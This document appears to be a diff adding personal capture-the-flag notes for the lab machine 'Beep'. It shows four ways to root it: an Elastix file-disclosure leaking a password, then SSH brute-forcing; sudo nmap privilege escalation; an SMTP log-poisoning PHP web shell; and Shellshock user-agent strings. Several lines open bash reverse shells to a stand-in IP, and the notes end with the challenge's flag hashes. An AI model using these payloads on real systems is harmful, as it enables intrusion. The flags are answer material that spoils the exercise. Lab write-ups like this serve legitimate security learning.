@@ -1,0 +1,88 @@
+Readme Beep 
+(Thanks to ippsec videos)
+
+Various ports open and following were helpful:
+22		SSH
+25		SMTP
+80		Http server	
+443		Https server
+10000	MiniServ
+
+
+http Webserver redirected to https:
+
+==========================================
+Method 1:
+
+It showed elastix CMS opensource which is nothing but FreePBX
+
+Elastix has a known vulnerability of listing conf file via Graph.php file
+It helped to get the password: jEhdIekWmdjE
+
+Threw this password along with other users revealed from /etc/passwd file in hydra for SSH
+Boom! Got a shell with root@jEhdIekWmdjE and it was a root shell!
+
+==================================================-==============================
+Method 2:
+
+svwar utility helps to get extensions over the elastix cms
+
+svwar -m INVITE -e200-250 IP
+Gave extension 233 available
+
+Also could be achieved by using /plugin revealed by dirbuster
+
+This extension would be helpful since there is an exploit related to such extension with elastix
+
+Following changes to that exploit python file would work:
+
+For priv esc we could use 
+# sudo -l (show we could nmap)
+# sudo nmap --interactive
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+import urllib2, ssl
+
+request = urllib2.Request(url)
+response = urllib2.urlopen(request, context=ssl._create_unverified_context())
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+==================================================================================
+Method 3:
+
+SMTP LFI: (get the username and home dir from /etc/passwd directory listing LFI)
+" nc IP 25 then:
+EHLO blahblah (to get all commands)
+VRFY username@localhost
+mail from:anything@haha.io
+rept to:username@localhost
+data
+Subject: You are pwned
+<? Php echo system($_REQUEST['cmd'];?>
+
+.
+"
+
+Then check the userdirectory listing by using LFI
+the log files passing cmd command then would get shell with 
+bash -i >& /dev/tcp/IP/port 0>&1
+===================================================================================
+Method 4:
+MiniServ with WebServ on port 10000
+able to run CGI-scripts
+thus could be vulnerable to Shell-Shock
+
+cgi scripts if accessbile (like in MiniServ/ Webmin server without login):
+Shell shock:
+user agent: 
+() { :; }; /bin/echo helllo
+() { :; }; bash -i >& /dev/tcp/IP/PORT 0>&1
+
+This gives root shell!
+===================================================================================
+
+
+User: fanis:
+aeff3def0c765c2677b94715cffa73ac
+
+Root:
+d88e006123842106982acce0aaf453f0
